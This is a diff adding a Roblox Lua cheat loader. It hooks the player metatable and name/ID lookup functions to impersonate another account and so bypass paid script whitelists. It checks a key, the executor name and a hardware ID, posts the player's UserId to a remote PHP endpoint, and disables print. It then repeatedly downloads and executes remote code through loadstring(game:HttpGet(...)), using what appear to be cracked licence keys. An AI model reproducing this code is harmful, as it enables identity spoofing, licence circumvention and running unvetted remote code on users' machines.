@@ -1,0 +1,360 @@
+repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
+if not game:GetService("Players").LocalPlayer then return end
+
+print(getgenv().Key)
+print(getgenv().Script)
+print("Our Discord: https://discord.gg/FcEGmkNDDe")
+
+local DyKPCaCpCSOE, vLonrrtbMpiL = { UserId = 7951465926, DisplayName = "tobi1910", Name = "trung1910a" }, false
+
+local meta, oldIndex = getrawmetatable(game:GetService("Players").LocalPlayer), nil
+setreadonly(meta, false)
+oldIndex = meta.__index
+
+meta.__index = newcclosure(function(self, key)
+    return (vLonrrtbMpiL and rawget(DyKPCaCpCSOE, key)) or oldIndex(self, key)
+end)
+
+setreadonly(meta, true)
+
+local function eLkDOYTMQbCc(func)
+    return function(_, val)
+        return vLonrrtbMpiL and (val == DyKPCaCpCSOE.UserId and DyKPCaCpCSOE.Name or val == DyKPCaCpCSOE.Name and DyKPCaCpCSOE.UserId) or func(_, val)
+    end
+end
+
+hookfunction(game:GetService("Players").GetNameFromUserIdAsync, eLkDOYTMQbCc(game:GetService("Players").GetNameFromUserIdAsync))
+hookfunction(game:GetService("Players").GetUserIdFromNameAsync, eLkDOYTMQbCc(game:GetService("Players").GetUserIdFromNameAsync))
+
+function CREsenHyRGfq()
+    vLonrrtbMpiL = not vLonrrtbMpiL
+    warn("I've Cracked Countless Scripts And Tools, Yet One Mystery Remains Is: LHKK-11-3463311754. Are They Past Encryptions Or New Defenses Rising Against Me?")
+end
+
+local key = getgenv().Key
+if not key or key == "" then
+    warn("Key Not Found, Please Provide Your Key, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    game.Players.LocalPlayer:Kick("Key Not Found, Please Write Down Key For Use, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
+
+if not getgenv().Script or getgenv().Script == "" then
+    warn("Name Script Not Found, Please Provide Your Name Script, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    game.Players.LocalPlayer:Kick("Name Script Not Found, Please Write Down Name Script For Use, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
+
+if identifyexecutor() ~= "Arceus X" and identifyexecutor() ~= "Codex" and identifyexecutor() ~= "VegaX" and identifyexecutor() ~= "Cryptic" and identifyexecutor() ~= "Trigon" and identifyexecutor() ~= "Nebula" and identifyexecutor() ~= "Illusion" and identifyexecutor() ~= "Evon" then
+    warn("Your Executor Is Invalid, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    game.Players.LocalPlayer:Kick("Your Executor Is Invalid, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
+
+if gethwid() ~= "f703e3d6f898de7d" then
+    warn("Your Hardware ID Is Invalid, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    game.Players.LocalPlayer:Kick("Your Hardware ID Is Invalid, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
+
+local HttpService = game:GetService("HttpService")
+
+local function qzUqbbIHVuyf(authKey)
+    if not authKey then 
+        return false, "Authorization key is nil" 
+    end
+
+    local url = "https://websitebancaycanh.id.vn/nSDs6oT4xDx.php"
+    local requestFunc = syn and syn.request or http_request or http and http.request
+    if not requestFunc then 
+        return false, "HTTP request function is unavailable" 
+    end
+
+    local body = HttpService:JSONEncode({
+        iddiscord = tostring(game.Players.LocalPlayer.UserId)
+    })
+
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ['Authorization'] = authKey,
+                ['Content-Type'] = 'application/json'
+            },
+            Body = body
+        })
+    end)
+
+    if not success then 
+        return false, "Request failed: " .. tostring(response)
+    end
+
+    if response.StatusCode ~= 200 then
+        return false, "Invalid status code: " .. tostring(response.StatusCode)
+    end
+
+    local decodeSuccess, data = pcall(function()
+        return HttpService:JSONDecode(response.Body)
+    end)
+
+    if not decodeSuccess or not data then 
+        return false, "Failed to decode response: " .. tostring(response.Body)
+    end
+
+    if data.success == "true" or data.redeemer == "true" then
+        return true, data.message or "Operation successful"
+    else
+        return false, data.message or "Authentication failed"
+    end
+end
+
+local status, message = qzUqbbIHVuyf(key)
+if not status then
+    warn("Your Key Is Invalid, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    game.Players.LocalPlayer:Kick("Your Key Is Invalid, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
+
+local function noop() end
+hookfunction(print, noop)
+
+if getgenv().Script == "W-AzurePremiumTrueV2" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumBFOneClickLite" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/vinhuchi/rblx/main/W-azure/BloxFruit/OneClickLoader.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumBFBountyV2.2" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/248f97d7a28a4d09c641d8279a935333.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumAVOneClick" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/vinhuchi/rblx/main/W-azure/AnimeVanguard/OneClickLoader.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumADOneClick" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            if getgenv().Loaded then
+                return 
+            end
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/950b9999b1274e4d6f9fadc85fe2d77e.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumADGemSender" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3051457467c11f25288cfe2de3708373.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumADMain" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            if getgenv().Loaded then
+                return 
+            end
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/57d5eebd9b111f1639a5970102487168.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumBFBountyV2" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            script_key = "ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs"
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b6d24ef1f7dab9c7b22f259a3db6c47e.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        else
+            script_key = "https://discord.gg/FcEGmkNDDe"
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "W-AzurePremiumBFShowItems" then
+    CREsenHyRGfq()
+
+    warn("Bypass Feature Enabled")
+
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            if script_key then
+                return
+            end
+            script_key = 'ghaKVMcnTTXvcoMvGfkBNTQyhhlDbnFs'
+            repeat wait() until game:IsLoaded()
+            wait(2)
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a7e117dfcf8f6b9f6f561afa714c7d7f.lua"))()
+        end)
+
+        if IjWyEhjvSrjK then
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+        else
+            script_key = 'https://discord.gg/FcEGmkNDDe'
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "XeroHub" then
+    CREsenHyRGfq()
+    loadstring(game:HttpGet("https://websitebancaycanh.id.vn/usgxEWsLoInM.lua"))()
+    warn("Bypass Feature Enabled")
+  
+    local IjWyEhjvSrjK = false
+    local fSwVjlGyGnRE
+
+    repeat
+        IjWyEhjvSrjK, fSwVjlGyGnRE = pcall(function()
+            repeat task.wait(XeroTime) pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Xero2409/XeroHub/refs/heads/main/kaitun.lua"))() end) until getgenv().Check_Execute
+        end)
+
+        if IjWyEhjvSrjK then
+            if isfile("Xero Hub/key.txt") then
+                delfile("Xero Hub/key.txt")
+            end
+        else
+            if isfile("Xero Hub/key.txt") then
+                delfile("Xero Hub/key.txt")
+            end
+        end
+    until IjWyEhjvSrjK
+elseif getgenv().Script == "BuangHubAA" then
+    CREsenHyRGfq()
+    warn("Bypass Feature Enabled")
+    getgenv().script_key = "QiaLAuPqgsfjyYAGFLsmihAUffUoqmuW";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "BuangHubALS" then
+    CREsenHyRGfq()
+    warn("Bypass Feature Enabled")
+    getgenv().script_key = "WwDjgkIhhJgUNOTUEULIxvOxoNPgVisx";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "BuangHubAR" then
+    CREsenHyRGfq()
+    warn("Bypass Feature Enabled")
+    getgenv().script_key = "equfAAAzwbsHsxbhDuOaSUHhEwRiSoLt";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+elseif getgenv().Script == "BuangHubAV" then
+    CREsenHyRGfq()
+    warn("Bypass Feature Enabled")
+    getgenv().script_key = "JDIUmpazspRpwLwiBvrgNUMfMfrPVXog";
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/BUANGHUB.lua"))() 
+else
+    warn("Your Script Is Wrong, Please Check Here: https://discord.gg/FcEGmkNDDe")
+    game.Players.LocalPlayer:Kick("Your Script Is Wrong, Please Check Here: https://discord.gg/FcEGmkNDDe")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+end
+
